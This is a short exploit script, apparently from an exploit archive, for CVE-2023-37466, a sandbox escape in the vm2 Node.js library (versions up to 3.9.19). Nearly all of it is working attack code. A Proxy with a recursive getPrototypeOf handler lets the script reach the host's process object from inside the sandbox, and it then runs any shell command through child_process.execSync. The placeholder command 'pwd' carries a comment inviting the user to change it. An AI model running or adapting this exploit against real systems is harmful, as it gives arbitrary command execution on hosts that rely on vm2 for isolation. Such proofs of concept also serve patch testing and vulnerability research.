/*
# Exploit Title: vm2 Sandbox Escape vulnerability
# Date: 23/12/2023
# Exploit Author: Calil Khalil & Adriel Mc Roberts
# Vendor Homepage: https://github.com/patriksimek/vm2
# Software Link: https://github.com/patriksimek/vm2
# Version: vm2 <= 3.9.19
# Tested on: Ubuntu 22.04
# CVE : CVE-2023-37466
*/

const { VM } = require("vm2");
const vm = new VM();

const command = 'pwd'; // Change to the desired command

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}

try {
    const handler = {
        getPrototypeOf(target) {
            (function stack() {
                new Error().stack;
                stack();
            })();
        }
    };

    const proxiedErr = new Proxy({}, handler);

    throw proxiedErr;
} catch ({ constructor: c }) {
    const childProcess = c.constructor('return process')().mainModule.require('child_process');
    childProcess.execSync('${command}');
}
`;

console.log(vm.run(code));